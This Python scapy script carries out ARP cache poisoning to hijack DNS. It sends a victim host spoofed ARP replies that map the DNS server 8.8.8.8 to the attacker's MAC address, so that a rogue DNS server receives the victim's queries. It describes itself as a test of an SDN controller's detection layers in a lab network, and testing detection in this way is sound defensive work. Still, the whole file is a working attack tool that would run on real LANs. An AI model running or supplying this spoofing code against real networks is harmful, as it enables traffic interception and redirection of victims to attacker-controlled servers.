#!/usr/bin/env python3
"""
dns_hijack_attack.py - DNS Hijacking Attack via Rogue DNS Server
Tests Layer 1/2 (DAI + Flow Analysis) detection in enhanced controller.

This attack:
  1. Starts a fake DNS server on attacker host
  2. Uses ARP spoofing to intercept DNS queries
  3. Responds with malicious IP addresses
  4. Victims connect to attacker's IP instead of legitimate server

Usage (as attacker host):
  # Terminal 1: Start fake DNS server
  sudo python3 mini_dns_server.py 10.0.1.2 www.lab.example

  # Terminal 2: Start DNS hijacking (only ARP portion)
  sudo python3 dns_hijack_attack.py \\
    --victim 10.0.2.1 \\
    --attacker_dns 10.0.1.2 \\
    --duration 60 \\
    --interface h1-eth0
"""

import argparse
import time
import sys
import socket
from scapy.all import ARP, send, get_if_hwaddr, srp, Ether

def get_mac(ip, iface):
    """Resolve IP to MAC address using ARP"""
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2,
            iface=iface,
            verbose=False
        )
        return ans[0][1].hwsrc if ans else None
    except Exception as e:
        print(f"[!] Error resolving {ip}: {e}")
        return None

def send_arp_spoofed(victim_ip, victim_mac, spoof_ip, attacker_mac, iface):
    """Send a single spoofed ARP reply"""
    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(pkt, iface=iface, verbose=False)

def main():
    parser = argparse.ArgumentParser(
        description="DNS Hijacking Attack for SDN Detection Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Flow:
  1. Attacker runs mini_dns_server.py on h2 (attacker) listening on port 53
  2. Attacker runs this script to poison DNS server ARP entry on victim
  3. Victim tries to resolve hostname → packet goes to attacker's fake DNS
  4. Fake DNS responds with attacker's IP
  5. Controller detects ARP poisoning of DNS server

Examples:
  # Attack h3's DNS resolution for 60 seconds
  sudo python3 dns_hijack_attack.py \\
    --victim 10.0.2.1 \\
    --attacker_dns 10.0.1.2 \\
    --duration 60 \\
    --interface h1-eth0

  # Attack h4 for 30 seconds
  sudo python3 dns_hijack_attack.py \\
    --victim 10.0.2.2 \\
    --attacker_dns 10.0.1.2 \\
    --duration 30 \\
    --interface h1-eth0
        """
    )
    parser.add_argument("--victim", required=True, help="Victim IP (e.g., 10.0.2.1)")
    parser.add_argument("--attacker_dns", required=True, help="Fake DNS server IP (e.g., 10.0.1.2)")
    parser.add_argument("--duration", type=int, required=True, help="Attack duration in seconds")
    parser.add_argument("--interface", required=True, help="Network interface (e.g., h1-eth0)")
    parser.add_argument("--interval", type=float, default=2, help="Interval between ARP packets (default: 2s)")
    
    args = parser.parse_args()
    
    victim_ip = args.victim
    attacker_dns_ip = args.attacker_dns
    iface = args.interface
    duration = args.duration
    interval = args.interval
    
    # Get DNS server IP (assume Google DNS as default victim target)
    default_dns_ip = "8.8.8.8"  # Google DNS
    
    print("[*] DNS Hijacking Attack Initialization")
    print(f"    Victim:        {victim_ip}")
    print(f"    Fake DNS:      {attacker_dns_ip}")
    print(f"    Default DNS:   {default_dns_ip} (will be spoofed)")
    print(f"    Interface:     {iface}")
    print(f"    Duration:      {duration}s")
    print(f"    Interval:      {interval}s")
    
    # Resolve victim MAC
    print("\n[*] Resolving MAC addresses...")
    victim_mac = get_mac(victim_ip, iface)
    attacker_mac = get_if_hwaddr(iface)
    
    if not victim_mac:
        print(f"[!] Error: Could not resolve {victim_ip}")
        sys.exit(1)
    
    print(f"    Victim MAC:    {victim_mac}")
    print(f"    Attacker MAC:  {attacker_mac}")
    
    # Verify fake DNS is reachable
    print(f"\n[*] Checking fake DNS server at {attacker_dns_ip}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        sock.sendto(b'\x00\x00', (attacker_dns_ip, 53))
        print(f"[+] Fake DNS server appears to be running")
    except Exception as e:
        print(f"[!] Warning: Cannot reach DNS server at {attacker_dns_ip}:{e}")
        print(f"    Make sure mini_dns_server.py is running on attacker host")
    
    # Start attack
    print(f"\n[*] Starting DNS hijacking attack...")
    print(f"    Poisoning: {default_dns_ip} (8.8.8.8) → {attacker_dns_ip}")
    print("="*70)
    
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Tell victim that DNS server (8.8.8.8) is at attacker's MAC
            # When victim tries to reach 8.8.8.8, it goes to attacker instead
            send_arp_spoofed(victim_ip, victim_mac, default_dns_ip, attacker_mac, iface)
            
            packet_count += 1
            elapsed = int(time.time() - start_time)
            
            print(f"[+] Packet: {packet_count:3d} | Elapsed: {elapsed:3d}s | "
                  f"Poisoning: {default_dns_ip} → {attacker_mac}")
            
            time.sleep(interval)
    
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
    
    finally:
        print("\n" + "="*70)
        print("[*] Cleaning up...")
        print("[*] Attack completed")
        
        elapsed = int(time.time() - start_time)
        print("\n" + "="*70)
        print("[*] Attack Statistics:")
        print(f"    Total ARP spoofed: {packet_count}")
        print(f"    Duration:          {elapsed} seconds")
        if packet_count > 0:
            print(f"    Throughput:        {packet_count / (elapsed + 1):.2f} pkt/s")
        print("="*70)
        print("\nNote: To fully detect this attack, ensure:")
        print("  1. mini_dns_server.py is running on attacker (h2)")
        print("  2. Victim (h3/h4) tries to resolve DNS (e.g., 'nslookup www.lab.example')")
        print("  3. Enhanced controller is running and monitoring for:")
        print("     - ARP rate limiting")
        print("     - Port 53 (DNS) traffic anomalies")

if __name__ == "__main__":
    main()